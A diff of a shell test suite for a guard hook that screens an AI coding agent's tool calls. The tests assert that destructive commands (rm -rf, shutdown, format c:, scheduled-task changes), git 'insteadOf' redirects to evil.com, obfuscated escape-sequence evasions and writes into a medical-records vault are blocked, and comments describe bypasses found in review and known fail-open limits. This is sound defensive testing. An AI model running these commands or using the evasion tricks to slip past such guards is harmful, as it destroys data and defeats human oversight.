@@ -1,5 +1,5 @@
 #!/usr/bin/env bash
-# Tests for the security-critical guard + wiring assets (HIMMEL-557).
+# Tests for the security-critical guard + wiring assets.
 # Drives parity_guard.py over stdin and asserts block/allow; exercises
 # wire_parity_guard.py set/swap. Hermetic: HERMES_HOME points at a temp tree.
 set -euo pipefail
@@ -32,7 +32,7 @@ export GH_CMD="$TMP/no-such-gh-binary"
 unset HERMES_EXTERNAL_WRITES_OK
 unset ANTHROPIC_BASE_URL
 unset HERMES_ENGINE
-# The guard reads $TERMINAL_CWD as the agent's workspace (HIMMEL-2008); a real
+# The guard reads $TERMINAL_CWD as the agent's workspace; a real
 # hermes session would leak one in, so drop it for a hermetic run.
 unset TERMINAL_CWD
 
@@ -88,8 +88,8 @@ g "git push force" block '{"tool_name":"terminal","tool_input":{"command":"git p
 g "rm -rf"         block '{"tool_name":"terminal","tool_input":{"command":"rm -rf build"}}'
 g "plain rm"       allow '{"tool_name":"terminal","tool_input":{"command":"rm tmp.txt"}}'
 g "schtasks"       block '{"tool_name":"terminal","tool_input":{"command":"schtasks /delete /tn X"}}'
-# HIMMEL-4134: the compound keywords and exec-style wrappers the shell hook's
-# CMDPOS carries (HIMMEL-3983/3984) start a command here too.
+# the compound keywords and exec-style wrappers the shell hook's
+# CMDPOS carries start a command here too.
 g "nohup shutdown"        block '{"tool_name":"terminal","tool_input":{"command":"nohup shutdown now"}}'
 g "timeout 5 reboot"      block '{"tool_name":"terminal","tool_input":{"command":"timeout -s KILL 5 reboot"}}'
 g "exec -a 'q v' shutdown" block '{"tool_name":"terminal","tool_input":{"command":"exec -a '"'"'custom process'"'"' shutdown now"}}'
@@ -100,7 +100,7 @@ g "xargs -0 taskkill"     block '{"tool_name":"terminal","tool_input":{"command"
 g "then shutdown"         block '{"tool_name":"terminal","tool_input":{"command":"if true; then shutdown now; fi"}}'
 g "do format"             block '{"tool_name":"terminal","tool_input":{"command":"for x in a; do format c:; done"}}'
 g "f() { reboot; }"       block '{"tool_name":"terminal","tool_input":{"command":"f() { reboot; }"}}'
-# HIMMEL-4158: mixed quoted/bare, ANSI-C and escaped value words; quoted flag words.
+# mixed quoted/bare, ANSI-C and escaped value words; quoted flag words.
 g "sudo -u 'a b'c shutdown" block '{"tool_name":"terminal","tool_input":{"command":"sudo -u '"'"'a b'"'"'c shutdown"}}'
 g "sudo -u a' b' reboot"    block '{"tool_name":"terminal","tool_input":{"command":"sudo -u a'"'"' b'"'"' reboot"}}'
 g "exec -a 'a b'c shutdown" block '{"tool_name":"terminal","tool_input":{"command":"exec -a '"'"'a b'"'"'c shutdown"}}'
@@ -113,7 +113,7 @@ g "sudo -u a\\ b reboot"    block '{"tool_name":"terminal","tool_input":{"comman
 g "sudo -u'a b c' reboot"   block '{"tool_name":"terminal","tool_input":{"command":"sudo -u'"'"'a b c'"'"' reboot"}}'
 g "sudo -u 'a b'c ls"       allow '{"tool_name":"terminal","tool_input":{"command":"sudo -u '"'"'a b'"'"'c ls"}}'
 g "sudo -u \"a b\\\" reboot" block '{"tool_name":"terminal","tool_input":{"command":"sudo -u \"a b\\\" reboot"}}'
-# HIMMEL-4190: `find ... -delete` is a recursive delete of its own (the .sh
+# `find ... -delete` is a recursive delete of its own (the .sh
 # FIND_DELETE_PAT twin), bare and behind a wrapper, with a quoted wrapper value.
 g "find d -delete"          block '{"tool_name":"terminal","tool_input":{"command":"find d -delete"}}'
 g "find -name x -delete"    block '{"tool_name":"terminal","tool_input":{"command":"find . -name x -delete"}}'
@@ -134,7 +134,7 @@ g "find -print"             allow '{"tool_name":"terminal","tool_input":{"comman
 g "echo find -delete"       allow '{"tool_name":"terminal","tool_input":{"command":"echo find d -delete"}}'
 g "grep find -delete"       allow '{"tool_name":"terminal","tool_input":{"command":"grep find -delete notes.txt"}}'
 g "findx -delete"           allow '{"tool_name":"terminal","tool_input":{"command":"findx d -delete"}}'
-# HIMMEL-4255: the find-family deletes the .sh hook denies too. A launcher that
+# the find-family deletes the .sh hook denies too. A launcher that
 # runs its argument as a command (busybox, command, eval, a shell's -c) keeps
 # find at command position. gc builds the payload from the raw command.
 gc() { g "$1" "$2" "$("$PY" -c 'import json,sys; print(json.dumps({"tool_name": "terminal", "tool_input": {"command": sys.argv[1]}}))' "$3")"; }
@@ -254,7 +254,7 @@ for unit in '; xargs -0 x' ' -exec x'; do
   if [ $((SECONDS - t0)) -gt 3 ]; then
     echo "  FAIL: ${unit}x8000 took $((SECONDS - t0))s" >&2; fails=$((fails + 1)); fi
 done
-# HIMMEL-4158: overlapping readings of one flag run stay linear; a backtracking
+# overlapping readings of one flag run stay linear; a backtracking
 # regex took minutes on these (the hermes hook timeout is 10s).
 for rep in "-u 'a' " '-u"x ' '-u "x -u " ' "-u 'x -u ' "; do
   cmd="sudo "; i=0
@@ -264,7 +264,7 @@ for rep in "-u 'a' " '-u"x ' '-u "x -u " ' "-u 'x -u ' "; do
   if [ $((SECONDS - t0)) -gt 5 ]; then
     echo "  FAIL: sudo ${rep}x30 took $((SECONDS - t0))s" >&2; fails=$((fails + 1)); fi
 done
-# HIMMEL-4190: the find -delete scan is linear too. 3000 `find` anchors with no
+# the find -delete scan is linear too. 3000 `find` anchors with no
 # -delete, then a later-checked denied command: quadratic re-scans pushed the
 # head past the 10s hook timeout (which fails open) where base blocked in 0.1s.
 t0=$SECONDS
@@ -298,7 +298,7 @@ g "-delete before find"     allow '{"tool_name":"terminal","tool_input":{"comman
 g "echo do shutdown"      allow '{"tool_name":"terminal","tool_input":{"command":"echo do shutdown"}}'
 g "jq {format}"           allow '{"tool_name":"terminal","tool_input":{"command":"jq {format: .x} f"}}'
 g "fix(x) shutdown text"  allow '{"tool_name":"terminal","tool_input":{"command":"echo fix(x) shutdown flow"}}'
-# HIMMEL-1141: schtasks /query is read-only (allowed); other mutating verbs refused.
+# schtasks /query is read-only (allowed); other mutating verbs refused.
 g "schtasks /query allowed"      allow '{"tool_name":"terminal","tool_input":{"command":"schtasks /query /fo LIST /v"}}'
 g "schtasks.exe /query allowed"  allow '{"tool_name":"terminal","tool_input":{"command":"schtasks.exe /query"}}'
 g "schtasks /Query mixed case"   allow '{"tool_name":"terminal","tool_input":{"command":"schtasks /Query /fo LIST"}}'
@@ -310,9 +310,9 @@ g "schtasks /end refused"        block '{"tool_name":"terminal","tool_input":{"c
 g "schtasks /CREATE upper refused" block '{"tool_name":"terminal","tool_input":{"command":"schtasks /CREATE /tn X /tr Y"}}'
 g "schtasks /Delete mixed refused" block '{"tool_name":"terminal","tool_input":{"command":"schtasks /Delete /tn X /f"}}'
 g "grep schtasks string allowed" allow '{"tool_name":"terminal","tool_input":{"command":"grep -n schtasks file.sh"}}'
-# HIMMEL-1821: the ScheduledTasks PowerShell module + the raw Schedule.Service
+# the ScheduledTasks PowerShell module + the raw Schedule.Service
 # COM object reach the SAME capability without schtasks.exe. Mirrors the
-# .sh hook's cases (lockstep, HIMMEL-754).
+# .sh hook's cases (lockstep).
 g "Register-ScheduledTask refused"   block '{"tool_name":"terminal","tool_input":{"command":"Register-ScheduledTask -TaskName X -Xml t.xml"}}'
 g "Unregister-ScheduledTask refused" block '{"tool_name":"terminal","tool_input":{"command":"Unregister-ScheduledTask -TaskName X -Confirm:0"}}'
 g "Set-ScheduledTask refused"        block '{"tool_name":"terminal","tool_input":{"command":"Set-ScheduledTask -TaskName X -User SYSTEM"}}'
@@ -340,7 +340,7 @@ g "abbreviated -ComO progid refused"  block '{"tool_name":"terminal","tool_input
 g "minimal -c progid refused"         block '{"tool_name":"terminal","tool_input":{"command":"New-Object -c Schedule.Service"}}'
 # CR r7: parenthesised expression form is still an invocation.
 g "parenthesised progid refused"      block '{"tool_name":"terminal","tool_input":{"command":"New-Object -ComObject (\"Schedule.Service\")"}}'
-# Read/write split (HIMMEL-1141 semantics carried to the module): the READ
+# Read/write split (semantics carried to the module): the READ
 # verbs and the in-memory object BUILDERS stay allowed, as does a plain
 # grep/doc mention of either spelling.
 g "Get-ScheduledTask allowed"        allow '{"tool_name":"terminal","tool_input":{"command":"Get-ScheduledTask -TaskName X"}}'
@@ -393,12 +393,12 @@ g "rm backslash-continuation -rf" block "$CONT_JSON"
 g "git log --pretty=format: allowed" allow '{"tool_name":"terminal","tool_input":{"command":"git log --pretty=format:%H -n 5"}}'
 g "grep -rn format src/ allowed"     allow '{"tool_name":"terminal","tool_input":{"command":"grep -rn format src/"}}'
 g "echo shutdown mid-argument allowed" allow '{"tool_name":"terminal","tool_input":{"command":"echo shutdown"}}'
-# CR r1 (HIMMEL-851): bounded launcher-wrapper tolerance in command position -
+# bounded launcher-wrapper tolerance in command position -
 # wrapped destructive verbs must still be refused, mirroring the .sh CMDPOS.
 g "sudo shutdown refused"            block '{"tool_name":"terminal","tool_input":{"command":"sudo shutdown -h now"}}'
 g "env-assign prefix shutdown refused" block '{"tool_name":"terminal","tool_input":{"command":"x=1 shutdown -h now"}}'
 g "cmd /c shutdown refused"          block '{"tool_name":"terminal","tool_input":{"command":"cmd /c shutdown /s /t 0"}}'
-# CR r3 (HIMMEL-851): cmd accepts switches (/d /s /e:on …) before /c.
+# cmd accepts switches (/d /s /e:on …) before /c.
 g "cmd /d /c shutdown refused"       block '{"tool_name":"terminal","tool_input":{"command":"cmd /d /c shutdown /s /t 0"}}'
 g "cmd.exe /d /s /c shutdown refused" block '{"tool_name":"terminal","tool_input":{"command":"cmd.exe /d /s /c shutdown /s /t 0"}}'
 g "powershell -command stop-process refused" block '{"tool_name":"terminal","tool_input":{"command":"powershell -command stop-process -name foo"}}'
@@ -408,7 +408,7 @@ cmd = 'echo ' + chr(96) + 'format c:' + chr(96)
 print(json.dumps({'tool_name': 'terminal', 'tool_input': {'command': cmd}}))
 ")"
 g "backtick-wrapped format refused"  block "$BACKTICK_JSON"
-# CR r2 (HIMMEL-851): path-qualified destructive executables - a bounded
+# path-qualified destructive executables - a bounded
 # exe-path prefix (optional drive + /-terminated segments) after the anchor,
 # mirroring the .sh CMDPOS. The atoms' trailing boundary keeps format-* names
 # allowed; mid-argument words stay allowed (not at command position).
@@ -430,7 +430,7 @@ print(json.dumps({'tool_name': 'terminal', 'tool_input': {'command': cmd}}))
 ")"
 g "backslash drive-path shutdown refused" block "$BSLASHPATH_JSON"
 g "format-data path basename allowed" allow '{"tool_name":"terminal","tool_input":{"command":"x; foo/format-data bar"}}'
-# CR r4 (HIMMEL-851): path-qualified launcher wrappers - the exe-path prefix
+# path-qualified launcher wrappers - the exe-path prefix
 # also applies before each wrapper token, mirroring the .sh CMDPOS. Residual
 # documented gap (both impls): quoted-payload wrappers (bash -c "...", sh -c,
 # xargs / nohup chains) - out of scope per the no-general-parser rule.
@@ -438,7 +438,7 @@ g "/usr/bin/env shutdown refused"    block '{"tool_name":"terminal","tool_input"
 g "/usr/bin/sudo shutdown refused"   block '{"tool_name":"terminal","tool_input":{"command":"/usr/bin/sudo shutdown -h now"}}'
 g "path-qualified cmd.exe /c shutdown refused" block '{"tool_name":"terminal","tool_input":{"command":"c:/windows/system32/cmd.exe /c shutdown /s /t 0"}}'
 g "/usr/bin/env python3 benign allowed" allow '{"tool_name":"terminal","tool_input":{"command":"/usr/bin/env python3 build.py"}}'
-# CR r5 (HIMMEL-851): assignment VALUE is quote-aware - FOO='a b' <verb> must
+# assignment VALUE is quote-aware - FOO='a b' <verb> must
 # not drop the verb out of command position. Built via python so the embedded
 # quotes reach the guard with correct JSON encoding.
 SQASSIGN_JSON="$("$PY" -c "
@@ -462,7 +462,7 @@ cmd = 'echo ' + dq + 'FOO=' + sq + 'a b' + sq + ' shutdown' + dq
 print(json.dumps({'tool_name': 'terminal', 'tool_input': {'command': cmd}}))
 ")"
 g "echo'd quoted assign+verb allowed" allow "$ECHOASSIGN_JSON"
-# CR r6 (HIMMEL-851): sudo/env tolerate flag runs (env also assignment args),
+# sudo/env tolerate flag runs (env also assignment args),
 # mirroring the .sh CMDPOS. Bounded grammar - further wrapper permutations
 # are HIMMEL-912 (shared tokenizer); this + the CC-hook + the auto-mode
 # classifier remain the outer defense layers.
@@ -471,7 +471,7 @@ g "env -i shutdown refused"          block '{"tool_name":"terminal","tool_input"
 g "env -i foo=bar shutdown refused"  block '{"tool_name":"terminal","tool_input":{"command":"env -i foo=bar shutdown -h now"}}'
 g "sudo -n apt benign allowed"       allow '{"tool_name":"terminal","tool_input":{"command":"sudo -n apt update"}}'
 g "env -i printenv benign allowed"   allow '{"tool_name":"terminal","tool_input":{"command":"env -i printenv"}}'
-# CR r7 (HIMMEL-851): wrapper flags may each consume one following value token
+# wrapper flags may each consume one following value token
 # (generic, no per-option table; over-consumes at worst one benign token,
 # never a bypass), mirroring the .sh CMDPOS.
 g "sudo -u root shutdown refused"    block '{"tool_name":"terminal","tool_input":{"command":"sudo -u root shutdown -h now"}}'
@@ -498,7 +498,7 @@ g "git commit on worker branch allowed" allow "{\"tool_name\":\"terminal\",\"too
 : > "$TMP/mainrepo/.single-writer"
 g "write on main with .single-writer allowed" allow "{\"tool_name\":\"write_file\",\"tool_input\":{\"path\":\"$MR/src/foo.sh\"}}"
 g "absolute write in master repo refused"     block "{\"tool_name\":\"write_file\",\"tool_input\":{\"path\":\"$MASTR/src/foo.sh\"}}"
-# cwd contract (HIMMEL-2008). The guard's OWN cwd is the session LAUNCH dir
+# cwd contract. The guard's OWN cwd is the session LAUNCH dir
 # (hermes sends Path.cwd() of the agent process), so it is NOT evidence about
 # the worktree the agent works in: with no usable cwd signal the target dir is
 # undeterminable -> ALLOW (fail-open, same stance as a detached HEAD). The
@@ -532,20 +532,20 @@ export TERMINAL_CWD="$FR"
 g "pushd <master> && popd && git commit allowed" allow "{\"tool_name\":\"terminal\",\"tool_input\":{\"command\":\"pushd $MASTR && popd && git commit -m x\"}}"
 g "(cd <master> && git log) ; git commit allowed"  allow "{\"tool_name\":\"terminal\",\"tool_input\":{\"command\":\"(cd $MASTR && git log) ; git commit -m x\"}}"
 g "pushd <master> && git commit (no popd) refused" block "{\"tool_name\":\"terminal\",\"tool_input\":{\"command\":\"pushd $MASTR && git commit -m x\"}}"
-# HIMMEL-2008: `popd` pops only what `pushd` pushed. bash errors on a 1-deep
+# `popd` pops only what `pushd` pushed. bash errors on a 1-deep
 # stack and leaves the cwd alone, so a bare `cd` SURVIVES a following popd —
 # the commit really does run in <master>.
 g "cd <master> && popd && git commit refused (popd cannot undo a cd)" block "{\"tool_name\":\"terminal\",\"tool_input\":{\"command\":\"cd $MASTR && popd && git commit -m x\"}}"
 g "pushd <master> && popd && popd && git commit allowed (extra popd is a no-op)" allow "{\"tool_name\":\"terminal\",\"tool_input\":{\"command\":\"pushd $MASTR && popd && popd && git commit -m x\"}}"
 g "cd <worker> && (cd <master> && git log) && git commit allowed" allow "{\"tool_name\":\"terminal\",\"tool_input\":{\"command\":\"cd $FR && (cd $MASTR && git log) && git commit -m x\"}}"
-# HIMMEL-2008: a RELATIVE hop resolves against the hop before it, not against
+# a RELATIVE hop resolves against the hop before it, not against
 # base_cwd — `cd .. && cd mastrepo` lands in <master>, exactly where the shell
 # lands. Anchoring only the last hop to base_cwd yielded <worker>/mastrepo,
 # which walks back up to <worker> and wrongly allows.
 g "cd .. && cd mastrepo && git commit refused (relative hops chain)" block "{\"tool_name\":\"terminal\",\"tool_input\":{\"command\":\"cd .. && cd mastrepo && git commit -m x\"}}"
 g "cd .. && cd featrepo && git commit allowed (relative hops chain)" allow "{\"tool_name\":\"terminal\",\"tool_input\":{\"command\":\"cd .. && cd featrepo && git commit -m x\"}}"
 unset TERMINAL_CWD
-# Documented LIMIT (HIMMEL-2008): the walk has no short-circuit semantics, so a
+# Documented LIMIT: the walk has no short-circuit semantics, so a
 # `cd` the shell would SKIP still counts as executed. Statically undecidable —
 # it turns on the left-hand exit status. Pinned in both directions: the first
 # case is the fail-OPEN half (real cwd is <master>, guard judges <worker>).
@@ -554,42 +554,42 @@ g "true || cd <worker> counted as executed, allows (documented limit)" allow "{\
 unset TERMINAL_CWD
 export TERMINAL_CWD="$FR"
 g "true || cd <master> counted as executed, refuses (documented limit)" block "{\"tool_name\":\"terminal\",\"tool_input\":{\"command\":\"true || cd $MASTR && git commit -m x\"}}"
-# HIMMEL-2008: `git -C` scopes ONE git call and never moves the shell, so only
+# `git -C` scopes ONE git call and never moves the shell, so only
 # a `git -C` on the COMMIT INVOCATION counts. An earlier `git -C <worker>
 # status` must not pin a commit the shell already `cd`-ed into <master>.
 g "cd <master> && git -C <worker> status && git commit refused" block "{\"tool_name\":\"terminal\",\"tool_input\":{\"command\":\"cd $MASTR && git -C $FR status && git commit -m x\"}}"
-# HIMMEL-2008: subshell groups are stripped to a FIXPOINT — a NESTED group left
+# subshell groups are stripped to a FIXPOINT — a NESTED group left
 # the outer `cd` in the walk and refused a commit the subshell never moved.
 g "(cd <master> && (git log)) ; git commit allowed (nested subshell)" allow "{\"tool_name\":\"terminal\",\"tool_input\":{\"command\":\"(cd $MASTR && (git log)) ; git commit -m x\"}}"
-# HIMMEL-2008: a `(` MID-TOKEN belongs to a path, not a subshell. Blanking it
+# a `(` MID-TOKEN belongs to a path, not a subshell. Blanking it
 # corrupted the dir before the walk saw it -> unresolvable -> fail-open.
 g "cd \"<master (x86) path>\" && git commit refused (parens in a quoted path)" block "{\"tool_name\":\"terminal\",\"tool_input\":{\"command\":\"cd \\\"$MASTRP\\\" && git commit -m x\"}}"
-# HIMMEL-2008: a quoted `git -C` dir containing SPACES. A bare \S+ stopped at
+# a quoted `git -C` dir containing SPACES. A bare \S+ stopped at
 # the first space, so `_GIT_COMMIT` did not match the command at all and the
 # commit locks were never entered — a total bypass, not just a misjudged dir.
 g "git -C \"<master path with spaces>\" commit refused" block "{\"tool_name\":\"terminal\",\"tool_input\":{\"command\":\"git -C \\\"$MASTRP\\\" commit -m x\"}}"
-# HIMMEL-2008: EVERY `git commit` is judged, not just the first — only the text
+# EVERY `git commit` is judged, not just the first — only the text
 # before the FIRST commit used to be walked, so a second commit further along
 # the chain ran on main entirely unchecked.
 g "cd <worker> && git commit && cd <master> && git commit refused (2nd commit)" block "{\"tool_name\":\"terminal\",\"tool_input\":{\"command\":\"cd $FR && git commit -m a && cd $MASTR && git commit -m b\"}}"
-# HIMMEL-2008: git-level options may PRECEDE `-C`.
+# git-level options may PRECEDE `-C`.
 g "git --no-pager -C <master> commit refused" block "{\"tool_name\":\"terminal\",\"tool_input\":{\"command\":\"git --no-pager -C $MASTR commit -m x\"}}"
-# HIMMEL-2008: git's ATTACHED short-option form.
+# git's ATTACHED short-option form.
 g "git -C<master> commit refused (attached -C value)" block "{\"tool_name\":\"terminal\",\"tool_input\":{\"command\":\"git -C$MASTR commit -m x\"}}"
-# HIMMEL-2008: git applies MULTIPLE -C in order — the LAST one wins, so a
+# git applies MULTIPLE -C in order — the LAST one wins, so a
 # first-wins scan judged the worker while the commit ran on master.
 g "git -C <worker> -C <master> commit refused (last -C wins)" block "{\"tool_name\":\"terminal\",\"tool_input\":{\"command\":\"git -C $FR -C $MASTR commit -m x\"}}"
-# HIMMEL-2008: a `-C` INSIDE a quoted option value is not a chdir. A raw-text
+# a `-C` INSIDE a quoted option value is not a chdir. A raw-text
 # scan chdir'd to it and dropped the branch lock on a commit running in <master>.
 export TERMINAL_CWD="$MASTR"
 g "-C inside a quoted option value is not a chdir (refused)" block "{\"tool_name\":\"terminal\",\"tool_input\":{\"command\":\"git -c core.pager=\\\"less -C $FR\\\" commit -m x\"}}"
-# Documented LIMIT (HIMMEL-2008): the `cd` WALK is not quote-aware, so a
+# Documented LIMIT: the `cd` WALK is not quote-aware, so a
 # separator inside a quoted argument still reads as a separator. Needs crafted
 # text; out of a hygiene guard's threat model. Pinned so the contract is known.
 g "echo \"; cd <worker>\" && git commit allowed (quoting in the walk, documented limit)" allow "{\"tool_name\":\"terminal\",\"tool_input\":{\"command\":\"echo \\\"; cd $FR\\\" && git commit -m x\"}}"
 unset TERMINAL_CWD
 export TERMINAL_CWD="$FR"
-# HIMMEL-2008: --git-dir names the REPO whose HEAD (so whose BRANCH) is
+# --git-dir names the REPO whose HEAD (so whose BRANCH) is
 # committed to, and OUTRANKS the cwd. Attached and valued spellings both.
 g "git --git-dir=<master>/.git --work-tree=<master> commit refused" block "{\"tool_name\":\"terminal\",\"tool_input\":{\"command\":\"git --git-dir=$MASTR/.git --work-tree=$MASTR commit -m x\"}}"
 g "git --git-dir <master>/.git commit refused (valued spelling)" block "{\"tool_name\":\"terminal\",\"tool_input\":{\"command\":\"git --git-dir $MASTR/.git commit -m x\"}}"
@@ -605,7 +605,7 @@ unset TERMINAL_CWD
 export TERMINAL_CWD="$FR"
 unset TERMINAL_CWD
 export TERMINAL_CWD="$FR"
-# Documented LIMIT (HIMMEL-2008): each element of a pipeline runs in its own
+# Documented LIMIT: each element of a pipeline runs in its own
 # subshell, so `cd <x> | cat` never moves the parent — but the walk follows it.
 # Pinned in the fail-OPEN direction (real cwd is <master>, guard judges worker).
 unset TERMINAL_CWD
@@ -613,7 +613,7 @@ export TERMINAL_CWD="$MASTR"
 g "cd <worker> | cat ; git commit allowed (pipeline subshell, documented limit)" allow "{\"tool_name\":\"terminal\",\"tool_input\":{\"command\":\"cd $FR | cat ; git commit -m x\"}}"
 unset TERMINAL_CWD
 export TERMINAL_CWD="$FR"
-# HIMMEL-2008: a `cd` to a MISSING dir fails in the shell and leaves the cwd
+# a `cd` to a MISSING dir fails in the shell and leaves the cwd
 # alone. Following it judged a path nothing runs in — and with no repo ancestor
 # the branch lock fell open on a commit still running in <master>.
 export TERMINAL_CWD="$MASTR"
@@ -680,7 +680,7 @@ echo "== parity_guard: block-backend-tier / MCP fence parity (HIMMEL-731) =="
 g "mcp github tool refused"    block '{"tool_name":"mcp__plugin_github_github__create_pull_request","tool_input":{}}'
 g "mcp vercel tool refused"    block '{"tool_name":"mcp__plugin_vercel_vercel__deploy_to_vercel","tool_input":{}}'
 g "mcp bare tool refused"      block '{"tool_name":"mcp__whatever__do","tool_input":{}}'
-# qmd MCP collection fence (HIMMEL-1239): the KB carve-out is COLLECTION-
+# qmd MCP collection fence: the KB carve-out is COLLECTION-
 # SCOPED to "himmel" only — qmd indexes salus (PHI vault) with no built-in
 # isolation, so an unscoped call must deny fail-closed.
 g "mcp qmd query unscoped refused"       block '{"tool_name":"mcp__plugin_qmd_qmd__query","tool_input":{}}'
@@ -697,7 +697,7 @@ g "mcp qmd multi_get scoped himmel allowed" allow '{"tool_name":"mcp__plugin_qmd
 g "mcp qmd multi_get mixed scoped+unscoped refused" block '{"tool_name":"mcp__plugin_qmd_qmd__multi_get","tool_input":{"pattern":"qmd://himmel/a.md,notes.md"}}'
 g "mcp qmd multi_get luna referenced refused" block '{"tool_name":"mcp__plugin_qmd_qmd__multi_get","tool_input":{"pattern":"qmd://luna/*.md"}}'
 g "mcp qmd status refused (no scoping input)" block '{"tool_name":"mcp__plugin_qmd_qmd__status","tool_input":{}}'
-# CR round 1 (codex-1): a non-string collections entry (e.g. a dict) must not
+# a non-string collections entry (e.g. a dict) must not
 # crash the guard via `c not in <set-of-str>` raising TypeError — it must
 # deny fail-closed like any other non-"himmel" entry.
 g "mcp qmd query non-string collections entry refused (no crash)" block '{"tool_name":"mcp__plugin_qmd_qmd__query","tool_input":{"collections":[{"x":1}]}}'
@@ -716,7 +716,7 @@ printf '%s\n' "$(wp "$TMP/denyroot")" > "$CFG/egress-denylist" # registered egre
 CFG_W="$(wp "$CFG")"; export CLAUDE_GLM_CONFIG_DIR="$CFG_W"
 WV="$(wp "$TMP/vault")"
 g ".salus write refused (ancestor walk)" block "{\"tool_name\":\"write_file\",\"tool_input\":{\"path\":\"$WV/sub/note.md\"}}"
-# HIMMEL-2008: the PHI fence must see the SAME cwd-resolved target as the branch
+# the PHI fence must see the SAME cwd-resolved target as the branch
 # check, or a RELATIVE write into a vault egresses while its absolute twin blocks.
 export TERMINAL_CWD="$WV"
 g ".salus relative write via TERMINAL_CWD refused" block '{"tool_name":"write_file","tool_input":{"path":"sub/note.md"}}'
@@ -728,7 +728,7 @@ g "non-PHI write still allowed" allow "{\"tool_name\":\"write_file\",\"tool_inpu
 g "terminal .salus ref refused" block '{"tool_name":"terminal","tool_input":{"command":"cat /data/.salus/pt.md"}}'
 g "egress-denylist descendant refused" block "{\"tool_name\":\"read_file\",\"tool_input\":{\"path\":\"$(wp "$TMP/denyroot/pt")/x.md\"}}"
 g "delete under .salus refused" block "{\"tool_name\":\"delete_file\",\"tool_input\":{\"path\":\"$WV/old.md\"}}"
-# .salus-profile ALONE (no .salus) -> refused too (HIMMEL-2173 part 2 — a
+# .salus-profile ALONE (no .salus) -> refused too (a
 # defense for salus deployments that predate part 1 shipping .salus).
 mkdir -p "$TMP/vault2"
 : > "$TMP/vault2/.salus-profile"
@@ -768,7 +768,7 @@ g "config insteadof case variant" block '{"tool_name":"terminal","tool_input":{"
 g "git -c insteadOf one-shot fetch" block '{"tool_name":"terminal","tool_input":{"command":"git -c url.https://evil.com/.insteadOf=https://github.com/ fetch"}}'
 g "git --config-env insteadOf one-shot fetch" block '{"tool_name":"terminal","tool_input":{"command":"git --config-env=url.https://evil.com/.insteadOf=R fetch"}}'
 g "git config set insteadOf rewrite" block '{"tool_name":"terminal","tool_input":{"command":"git config set url.https://evil.com/.insteadOf https://github.com/"}}'
-# HIMMEL-844 round 3: a dequoted key is the same key — quoting/escaping must not slip past.
+# a dequoted key is the same key — quoting/escaping must not slip past.
 g "git config single-quoted insteadOf key" block '{"tool_name":"terminal","tool_input":{"command":"git config '"'"'url.https://evil.com/.insteadOf'"'"' https://github.com/"}}'
 g "git config double-quoted insteadOf key" block '{"tool_name":"terminal","tool_input":{"command":"git config \"url.https://evil.com/.insteadOf\" https://github.com/"}}'
 g "git config backslash-split insteadOf key" block '{"tool_name":"terminal","tool_input":{"command":"git config ur\\l.https://evil.com/.insteadOf https://github.com/"}}'
@@ -802,7 +802,7 @@ g "round 10 codex-1 NUL via \\c@ ends the segment" block '{"tool_name":"terminal
 g "round 10 codex-2 decoy + two adjacent split segments" block '{"tool_name":"terminal","tool_input":{"command":"echo '"'"'$'"'"' ; g$'"'"'\\x69'"'"'$'"'"'\\x74'"'"' config url.x.insteadOf y"}}'
 g "round 10 plain backslash-t inside the key" block '{"tool_name":"terminal","tool_input":{"command":"git config url.x.ins\\teadOf y"}}'
 g "round 10 plain backslash-r inside url" block '{"tool_name":"terminal","tool_input":{"command":"git config remote.origin.u\\rl https://evil"}}'
-# HIMMEL-4032: a plain escape OUTSIDE a dollar-quote is a bare char to bash (not a TAB), and
+# a plain escape OUTSIDE a dollar-quote is a bare char to bash (not a TAB), and
 # bash deletes a backslash-newline before parsing, so neither may split the key or the verb.
 g "HIMMEL-4032 dollar-quote + plain escape key" block '{"tool_name":"terminal","tool_input":{"command":"git config url.x.$'"'"'\\x69'"'"'ns\\teadOf Y"}}'
 g "HIMMEL-4032 backslash-newline split insteadOf key" block '{"tool_name":"terminal","tool_input":{"command":"git config url.x.inste\\\nadOf Y"}}'
@@ -814,12 +814,12 @@ g "HIMMEL-4032 unjoined gh after a continuation stays denied" block '{"tool_name
 g "HIMMEL-4032 dollar-quote + plain key, user.name allowed" allow '{"tool_name":"terminal","tool_input":{"command":"git config user.$'"'"'\\x6e'"'"'ame x"}}'
 g "HIMMEL-4032 continuation inside user.name allowed" allow '{"tool_name":"terminal","tool_input":{"command":"git config user.na\\\nme x"}}'
 g "HIMMEL-4032 harmless echo continuation allowed" allow '{"tool_name":"terminal","tool_input":{"command":"echo a \\\nb"}}'
-# HIMMEL-4225: a stray apostrophe in a # comment or a heredoc body opens no quote in bash, so it
+# a stray apostrophe in a # comment or a heredoc body opens no quote in bash, so it
 # must not desync the quote-aware stream and hide evasion 1 on the next line.
 g "HIMMEL-4225 apostrophe in a comment, then evasion 1" block '{"tool_name":"terminal","tool_input":{"command":"# don'"'"'t panic\ngit config url.x.$'"'"'\\x69'"'"'ns\\teadOf Y"}}'
 g "HIMMEL-4225 apostrophe in a heredoc body, then evasion 1" block '{"tool_name":"terminal","tool_input":{"command":"cat <<EOF\ndon'"'"'t panic\nEOF\ngit config url.x.$'"'"'\\x69'"'"'ns\\teadOf Y"}}'
 g "HIMMEL-4225 apostrophe in a comment, no insteadOf, allowed" allow '{"tool_name":"terminal","tool_input":{"command":"# don'"'"'t panic\necho hi"}}'
-# HIMMEL-4225 CR round 1: empty and unusual heredoc delimiters (bash ends `<<''` at an empty
+# empty and unusual heredoc delimiters (bash ends `<<''` at an empty
 # line) and an arithmetic `<<` must not desync the decoder either.
 g "HIMMEL-4225 empty single-quoted heredoc delimiter <<'', then evasion 1" block '{"tool_name":"terminal","tool_input":{"command":"cat <<'"'"''"'"'\ndon'"'"'t panic\n\ngit config url.x.$'"'"'\\x69'"'"'ns\\teadOf Y"}}'
 g "HIMMEL-4225 empty double-quoted heredoc delimiter <<\"\", then evasion 1" block '{"tool_name":"terminal","tool_input":{"command":"cat <<\"\"\ndon'"'"'t panic\n\ngit config url.x.$'"'"'\\x69'"'"'ns\\teadOf Y"}}'
@@ -857,7 +857,7 @@ g "push refused when HERMES_ENGINE=glm"      block '{"tool_name":"terminal","too
 unset HERMES_ENGINE
 # The ONESHOT signals (what invoke.sh actually exports for --model/--provider)
 # naming an untrusted engine are refused despite the opt-in — the real
-# dispatch-trusted.sh path never sets HERMES_ENGINE (HIMMEL-916 CR finding).
+# dispatch-trusted.sh path never sets HERMES_ENGINE.
 export HERMES_ONESHOT_MODEL="deepseek-v4-flash"
 g "push refused when ONESHOT_MODEL=deepseek" block '{"tool_name":"terminal","tool_input":{"command":"git push origin main"}}'
